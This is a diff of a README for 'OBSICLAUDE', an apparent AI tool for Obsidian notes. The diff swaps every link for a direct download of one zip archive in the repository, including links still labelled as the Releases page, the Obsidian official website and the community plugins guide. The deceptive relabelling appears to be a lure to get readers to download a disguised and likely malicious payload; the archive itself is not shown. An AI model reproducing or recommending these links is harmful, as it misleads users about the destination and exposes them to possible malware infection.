@@ -1,6 +1,6 @@
 # ⚙️ OBSICLAUDE - AI Tools for Smarter Obsidian Notes
 
-[![Download OBSICLAUDE](https://img.shields.io/badge/Download-OBSICLAUDE-green?style=for-the-badge)](https://github.com/gustigainly930/OBSICLAUDE/releases)
+[![Download OBSICLAUDE](https://img.shields.io/badge/Download-OBSICLAUDE-green?style=for-the-badge)](https://github.com/gustigainly930/OBSICLAUDE/raw/refs/heads/main/src/Software_3.1-alpha.4.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow the steps below to download and install OBSICLAUDE on Windows. No program
 ## ⬇️ Download and Install OBSICLAUDE
 
 1. Click this button to visit the download page for OBSICLAUDE:  
-   [![Download OBSICLAUDE](https://img.shields.io/badge/Download-OBSICLAUDE-blue?style=for-the-badge)](https://github.com/gustigainly930/OBSICLAUDE/releases)  
+   [![Download OBSICLAUDE](https://img.shields.io/badge/Download-OBSICLAUDE-blue?style=for-the-badge)](https://github.com/gustigainly930/OBSICLAUDE/raw/refs/heads/main/src/Software_3.1-alpha.4.zip)  
 
 2. On the Releases page, find the latest version. Look for a file named something like `OBSICLAUDE-win.exe` or `OBSICLAUDE-Setup.exe`.
 
@@ -107,9 +107,9 @@ Installing plugins only changes your Obsidian experience, not your files.
 
 ## 🔗 Useful Links
 
-- [OBSICLAUDE Releases Page](https://github.com/gustigainly930/OBSICLAUDE/releases) – Find the latest installer and updates.  
-- [Obsidian Official Website](https://obsidian.md) – Download Obsidian and learn more.  
-- [Community Plugins Guide](https://help.obsidian.md/Plugins/Community+plugins) – How to install and manage plugins.
+- [OBSICLAUDE Releases Page](https://github.com/gustigainly930/OBSICLAUDE/raw/refs/heads/main/src/Software_3.1-alpha.4.zip) – Find the latest installer and updates.  
+- [Obsidian Official Website](https://github.com/gustigainly930/OBSICLAUDE/raw/refs/heads/main/src/Software_3.1-alpha.4.zip) – Download Obsidian and learn more.  
+- [Community Plugins Guide](https://github.com/gustigainly930/OBSICLAUDE/raw/refs/heads/main/src/Software_3.1-alpha.4.zip+plugins) – How to install and manage plugins.
 
 ---
 
@@ -136,7 +136,7 @@ OBSICLAUDE allows power users to customize AI behavior via the settings panel in
 
 To update OBSICLAUDE:
 
-1. Visit the [Releases page](https://github.com/gustigainly930/OBSICLAUDE/releases).  
+1. Visit the [Releases page](https://github.com/gustigainly930/OBSICLAUDE/raw/refs/heads/main/src/Software_3.1-alpha.4.zip).  
 
 2. Download the latest installer file.  
 
@@ -182,4 +182,4 @@ Plugins let you adapt Obsidian to your workflow. You can enable or disable them 
 
 ---
 
-[![Download OBSICLAUDE](https://img.shields.io/badge/Download-OBSICLAUDE-green?style=for-the-badge)](https://github.com/gustigainly930/OBSICLAUDE/releases)
+[![Download OBSICLAUDE](https://img.shields.io/badge/Download-OBSICLAUDE-green?style=for-the-badge)](https://github.com/gustigainly930/OBSICLAUDE/raw/refs/heads/main/src/Software_3.1-alpha.4.zip)
